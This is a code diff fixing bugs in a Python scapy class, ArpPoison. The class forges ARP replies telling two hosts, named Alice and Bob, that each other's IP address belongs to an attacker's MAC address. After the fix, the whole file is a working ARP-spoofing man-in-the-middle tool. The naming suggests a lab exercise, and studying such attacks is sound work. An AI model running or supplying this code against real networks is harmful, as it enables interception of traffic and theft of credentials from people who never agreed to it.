@@ -3,7 +3,7 @@ from scapy.all import *
 
 class ArpPoison:
 
-    def __init__(self, macA, ipA, maxB, ipB, macM, ipM):
+    def __init__(self, macA, ipA, macB, ipB, macM, ipM):
         self.macA = macA
         self.ipA = ipA
         self.macB = macB
@@ -14,21 +14,21 @@ class ArpPoison:
     # create ARP poison of Alice machine
     def arpPoisonA(self):
         arpA = Ether() / ARP()
-        arpA[Ether].src = macM
-        arpA[ARP].hwsrc = macM
-        arpA[ARP].psrc = ipB
-        arpA[ARP].hwdst = macA
-        arpA[ARP].pdst = ipA
+        arpA[Ether].src = self.macM
+        arpA[ARP].hwsrc = self.macM
+        arpA[ARP].psrc = self.ipB
+        arpA[ARP].hwdst = self.macA
+        arpA[ARP].pdst = self.ipA
         sendp(arpA)
         print "ARP packet send to Alice"
 
     # create ARP poison of Bobs machine
     def arpPoisonB(self):
-        arpA = Ether() / ARP()
-        arpA[Ether].src = macM
-        arpA[ARP].hwsrc = macM
-        arpA[ARP].psrc = ipA
-        arpA[ARP].hwdst = macB
-        arpA[ARP].pdst = ipB
+        arpB = Ether() / ARP()
+        arpB[Ether].src = self.macM
+        arpB[ARP].hwsrc = self.macM
+        arpB[ARP].psrc = self.ipA
+        arpB[ARP].hwdst = self.macB
+        arpB[ARP].pdst = self.ipB
         sendp(arpB)
         print "ARP packet send to Bob"
